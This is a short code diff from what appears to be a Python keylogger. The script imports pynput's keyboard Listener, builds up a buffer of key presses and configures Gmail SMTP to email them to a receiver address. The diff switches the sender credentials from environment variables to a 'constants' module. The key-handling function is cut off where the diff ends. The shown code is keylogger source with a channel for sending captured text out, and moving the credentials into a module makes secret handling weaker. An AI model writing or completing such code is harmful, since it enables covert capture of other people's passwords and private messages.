@@ -1,18 +1,15 @@
 from pynput.keyboard import Listener, Key
 import smtplib, ssl
-import os
-from dotenv import load_dotenv
-
-load_dotenv()
+from constants import SENDER_EMAIL, RECEIVER_EMAIL, PASSWORD
 
 keys = ""
 count = 0
 
 port = 465  # For SSL
 smtp_server = "smtp.gmail.com"
-sender_email = os.getenv("SENDER_EMAIL")  # Enter your address
-receiver_email = os.getenv("RECEIVER_EMAIL")  # Enter receiver address
-password = os.getenv("PASSWORD")
+sender_email = SENDER_EMAIL  # Enter your address
+receiver_email = RECEIVER_EMAIL  # Enter receiver address
+password = PASSWORD
 
 
 def on_press(key):
